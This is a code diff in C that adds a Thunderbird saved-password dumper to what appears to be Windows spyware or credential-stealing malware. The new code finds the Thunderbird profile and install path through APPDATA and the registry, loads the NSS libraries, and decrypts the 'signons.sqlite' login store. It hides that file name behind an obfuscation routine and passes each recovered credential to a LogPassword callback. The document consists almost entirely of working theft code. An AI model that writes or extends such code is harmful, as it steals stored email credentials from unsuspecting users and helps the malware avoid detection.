@@ -12,6 +12,12 @@
 
 // callback for the password
 extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
+extern int DirectoryExists(WCHAR *path);
+extern int InitFFLibs(WCHAR *);
+extern int InitializeNSSLibrary(WCHAR *);
+extern void NSSUnload();
+extern int DumpSqlFF(WCHAR *profilePath, WCHAR *signonFile);
+extern WCHAR *DeobStringW(WCHAR *string);
 
 // Function declarations..
 WCHAR *GetTBProfilePath();
@@ -145,7 +151,49 @@ int DumpTB(WCHAR *profilePath, WCHAR *signonFile)
 	return 1;
 }
 
+WCHAR *GetTBLibPath()
+{
+	static WCHAR FullPath[MAX_PATH];
+	char regSubKey[]    = "Software\\Classes\\Thunderbird.Url.mailto\\shell\\open\\command";
+	char path[MAX_PATH];
+	char *p;
+	DWORD pathSize = MAX_PATH;
+	DWORD valueType;
+	HKEY rkey;
 
+	// Open firefox registry key
+	if( RegOpenKeyEx(HKEY_CURRENT_USER, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
+		return NULL;
+
+	// Read the firefox path
+	if( RegQueryValueEx(rkey, NULL, 0,  &valueType, (unsigned char*)&path, &pathSize) != ERROR_SUCCESS ) {
+        RegCloseKey(rkey);
+        return NULL;
+    }
+
+    if( pathSize <= 0 || path[0] == 0) {
+		RegCloseKey(rkey);
+		return NULL;
+	}
+
+	RegCloseKey(rkey);
+
+	// get the path and then remove the initial \"
+	if ((p = strrchr(path, '\\')) != NULL)
+		*p = '\0';
+
+	p = path;
+	
+	if( *p == '\"' ) 
+		p++;
+
+	if (!p)
+		return NULL;
+
+	_snwprintf_s(FullPath, MAX_PATH, L"%S", p);		
+
+	return FullPath;
+}
 
 WCHAR *GetTBProfilePath()
 {
@@ -153,11 +201,9 @@ WCHAR *GetTBProfilePath()
 	WCHAR iniFile[MAX_PATH];
 	WCHAR profilePath[MAX_PATH];
 	static WCHAR FullPath[MAX_PATH];
-	DWORD pathSize = MAX_PATH;
- 
+	
 	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);
 
-    // Get firefox profile directory
 	_snwprintf_s(iniFile, MAX_PATH, L"%s\\Thunderbird\\profiles.ini", appPath);
    
 	FNC(GetPrivateProfileStringW)(L"Profile0", L"Path", L"",  profilePath, sizeof(profilePath), iniFile);
@@ -171,11 +217,31 @@ WCHAR *GetTBProfilePath()
 int DumpThunderbird(void)
 {
 	WCHAR *ProfilePath = NULL; 	//Profile path
+	WCHAR *TBDir = NULL;   		//Thunderbird main installation path
 
 	ProfilePath = GetTBProfilePath();
-	
-	// get the password for the three versions
+
+	if (!ProfilePath || !DirectoryExists(ProfilePath)) 
+		return 0;
+
+	// get the password for the old versions
 	DumpTB(ProfilePath, L"signons.txt");   
-	
+
+	// get the password for the 3.1.x
+	TBDir = GetTBLibPath();
+
+	if (!TBDir || !DirectoryExists(TBDir)) 
+		return 0;
+
+	if (!InitFFLibs(TBDir))	
+		return 0;
+
+	if (!InitializeNSSLibrary(ProfilePath))
+		return 0;
+
+	DumpSqlFF(ProfilePath, DeobStringW(L"9Z71519.9ByZLI")); //"signons.sqlite"
+
+	NSSUnload();
+
 	return 0;
 }
